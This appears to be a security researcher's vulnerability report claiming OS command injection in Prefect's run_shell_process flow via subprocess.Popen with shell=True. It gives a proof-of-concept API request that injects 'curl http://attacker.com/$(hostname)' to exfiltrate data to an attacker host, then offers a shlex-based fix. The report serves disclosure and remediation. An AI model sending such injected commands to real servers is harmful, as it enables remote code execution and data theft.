# Prefect — Remote Command Execution via `run_shell_process` Flow

**Report ID:** YAQEEN-PREFECT-001
**Severity:** Critical (CVSS 9.8)
**Affected File:** `src/prefect/cli/shell.py:76`
**CWE:** CWE-78 (OS Command Injection)
**Researcher:** Yaqeen / Manadger Tech

---

## Summary

Prefect's `run_shell_process` flow executes shell commands via `subprocess.Popen(command, shell=True)` without any input sanitization. An attacker with access to the Prefect API (or any authenticated user) can trigger a flow run with an arbitrary command, achieving **Remote Code Execution** on the Prefect server.

---

## Vulnerability Details

**File:** `src/prefect/cli/shell.py` (lines 39-77)

```python
@flow
def run_shell_process(command: str, ...):
    ...
    with subprocess.Popen(command, shell=True, ...) as process:
        ...
```

The `command` parameter is a user-controlled string passed directly to `subprocess.Popen()` with `shell=True`. No sanitization, no allowlist, no escaping.

### Attack Vector

1. **Prefect Server API** — Any user with `RUN_FLOW` permission (or if auth is disabled) can call:
   ```
   POST /api/flow_runs/
   {"deployment_id": "...", "parameters": {"command": "malicious command"}}
   ```

2. **Prefect Cloud** — If the flow is deployed with public run access.

3. **CLI** — `prefect run --command "malicious command"`

### PoC

```bash
# Via Prefect Server API
curl -X POST https://target:4200/api/flow_runs/ \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "deployment_id": "run_shell_process-deployment",
    "parameters": {
      "command": "curl http://attacker.com/$(hostname) && echo PWNED > /tmp/prefect_poc.txt"
    }
  }'
```

### CVSS 9.8 (Critical)
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

---

## Related Issues

1. **`run_shell_script` in `utility.py:233`** — Same pattern via `create_subprocess_shell(command)`  
2. **Snowflake SQL Injection** — `database.py:1030,1184` — Raw SQL execution  
3. **BigQuery Path Traversal** — `bigquery.py:872` — `open(path, "rb")` without path validation  

---

## Remediation

```python
# BAD
subprocess.Popen(command, shell=True)

# GOOD
import shlex
subprocess.Popen(shlex.split(command), shell=False)
```

---

*Reported by Yaqeen / Manadger Tech — bugbounty@prefect.io*
